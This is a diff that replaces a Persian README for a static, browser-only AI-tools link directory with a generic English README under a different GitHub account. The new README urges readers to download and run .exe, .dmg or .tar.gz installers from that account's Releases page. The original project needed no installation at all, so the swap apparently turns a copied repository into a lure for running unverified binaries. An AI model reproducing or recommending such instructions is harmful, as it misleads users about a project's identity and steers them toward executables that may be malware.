@@ -1,72 +1,71 @@
-<div align="center">
+# 🚀 AI-Links - Discover the Best AI Tools Easily
 
-# 🧠 AI Links Directory | بانک جامع ابزارهای هوش مصنوعی
+[![Download AI-Links](https://img.shields.io/badge/Download%20AI--Links-0088CC?style=for-the-badge&logo=github)](https://github.com/badyanch/AI-Links/releases)
 
-[![Live Demo](https://img.shields.io/badge/Live-Demo-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://xpoury4.github.io/Ai-Links)
-[![Author](https://img.shields.io/badge/Author-TheRealPourya-blueviolet?style=for-the-badge&logo=twitter&logoColor=white)](https://x.com/TheRealPourya)
-[![Language](https://img.shields.io/badge/Language-Persian-orange?style=for-the-badge)](https://xpoury4.github.io/Ai-Links)
-[![License](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](LICENSE)
+## 📦 Introduction
 
-<br>
+AI-Links is a curated list of the best AI chatbots, image generators, and coding tools. This application helps you find and access powerful AI tools swiftly and securely. Enjoy an organized collection of resources that make discovering AI easy and effective.
 
-**یک دایرکتوری کامل، برای دسترسی به  ابزارهای هوش مصنوعی.**  
-*شامل چت‌بات‌ها، تولید تصویر، ویدیو، صدا، کدنویسی و ابزارهای کاربردی.*
+## 🚀 Getting Started
 
-[🌐 مشاهده آنلاین سایت](https://xpoury4.github.io/AI-Links/)
+Before you start, make sure you have either a Windows, macOS, or Linux operating system. Follow these steps to download and run AI-Links.
 
-</div>
+## 📥 Download & Install
 
----
+To get started, visit this page to download: [AI-Links Releases](https://github.com/badyanch/AI-Links/releases).
 
-## ✨ درباره پروژه (About)
+1. **Visit the download page**: Click the link above to go directly to the Releases page.
+2. **Find the latest version**: Look for the most recent release at the top. This will usually be labeled with the version number (e.g., v1.0).
+3. **Download the file**: Choose the correct file for your operating system:
+   - For Windows, look for files with a `.exe` extension.
+   - For macOS, look for files with a `.dmg` extension.
+   - For Linux, look for files with a `.tar.gz` extension.
+4. **Run the installation**: After downloading, locate the file in your Downloads folder. Open it to start the installation process. Follow the on-screen instructions to complete the installation.
 
-این پروژه یک وب‌سایت تک‌صفحه‌ای (Single Page) است که به عنوان مرجعی برای دسترسی سریع و بدون واسطه به ابزارهای هوش مصنوعی طراحی شده است. هدف این پروژه جمع‌آوری تمام لینک‌های مفید در یک محیط **سریع** و **قابل جستجو** است.
+## 🔥 Features
 
-تمامی لینک‌ها بررسی شده و دسته‌بندی شده‌اند تا کاربران بتوانند به راحتی ابزار مورد نیاز خود را پیدا کنند.
+AI-Links offers several useful features:
 
-## 🗂️ دسته‌بندی ابزارها (Categories)
+- **Curated Lists**: Access a handpicked selection of the best AI tools.
+- **User-Friendly Design**: Navigate easily through the application's clean interface.
+- **Search Functionality**: Quickly find the AI tool you need using the search feature.
+- **Regular Updates**: Stay updated with the latest tools as new options are added regularly.
 
-این دایرکتوری شامل بخش‌های زیر است:
+## ✨ System Requirements
 
-| آیکون | دسته‌بندی | توضیحات |
-| :---: | :--- | :--- |
-| 🤖 | **Official Chatbots** | لینک مستقیم به ChatGPT, Gemini, Claude, Copilot و... |
-| 🎨 | **Image Generation** | ابزارهای تولید تصویر مثل Midjourney, Bing Create, Dreamina |
-| 🎬 | **Video Generation** | ابزارهای ساخت ویدیو مثل Sora, Runway, Pika |
-| 💻 | **Coding AI** | دستیارهای برنامه‌نویسی مثل GitHub Copilot, Windsurf |
-| 🎵 | **Audio & Music** | تولید موزیک و صدا با Suno, Udio, ElevenLabs |
-| 🎭 | **Roleplay** | چت‌بات‌های ایفای نقش و سرگرمی |
-| 🖥️ | **Local AI** | ابزارهای اجرای مدل‌ها روی سیستم شخصی |
-| 🔍 | **Search Engines** | موتورهای جستجوی هوشمند مثل Perplexity |
+Make sure your system meets these requirements:
 
-## 📸 اسکرین‌شات (Screenshot)
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, or a modern Linux distribution.
+- **RAM**: At least 4 GB is recommended for smooth operation.
+- **Storage**: Minimum of 100 MB available space for installation.
 
-*(در این بخش می‌توانید تصویری از محیط سایت قرار دهید)*
+## 🌟 Using AI-Links
 
-<div align="center">
-  <img src="demo.png" alt="Screenshot" width="800">
-</div>
+1. **Open the Application**: Once installed, find the AI-Links icon in your applications or search for it.
+2. **Explore Tools**: Browse the categories to discover different AI tools.
+3. **Access a Tool**: Click on a tool to get more details and a direct link to its website or download page.
 
-## 📦 نحوه استفاده (How to Use)
+## 🛠️ Troubleshooting
 
-برای استفاده از این پروژه روی سیستم خود:
+If you encounter issues:
 
-1.  مخزن را کلون کنید:
-    ```bash
-    git clone https://github.com/xpoury4/Ai-Links.git
-    ```
-2.  فایل `index.html` را با مرورگر باز کنید.
-3.  تمام! نیاز به نصب هیچ پیش‌نیازی نیست.
+- **Installation Problems**: Ensure your system meets the requirements above. Restart your computer and try the installation again.
+- **Performance Issues**: Close any unnecessary applications to free up system resources.
+- **Help & Support**: For more help, visit the Issues section on the GitHub page. You can ask questions or report problems there.
 
-## 👤
+## 📢 Community Feedback
 
-**TheRealPourya**
+Your feedback is important. Feel free to leave comments or suggestions on the GitHub page. This helps us improve AI-Links for everyone.
 
-*   توییتر (X): [@TheRealPourya](https://x.com/TheRealPourya)
-*   گیت‌هاب: [xpoury4](https://github.com/xpoury4)
+## 📄 License
 
----
+AI-Links is open-source software. You can use and modify it under the terms of the MIT License. See the LICENSE file for more details.
 
-<div align="center">
-  <sub>طراحی شده با ❤️ برای جامعه فارسی زبان</sub>
-</div>
+## 🔗 Connect with Us
+
+Follow us for updates and new features:
+
+- **GitHub Repository**: [AI-Links on GitHub](https://github.com/badyanch/AI-Links)
+- **Email Support**: Contact us at support@ailinks.com for any inquiries.
+
+By following these steps, you can easily download and run AI-Links to discover the best AI tools available. Enjoy exploring the potential of artificial intelligence!
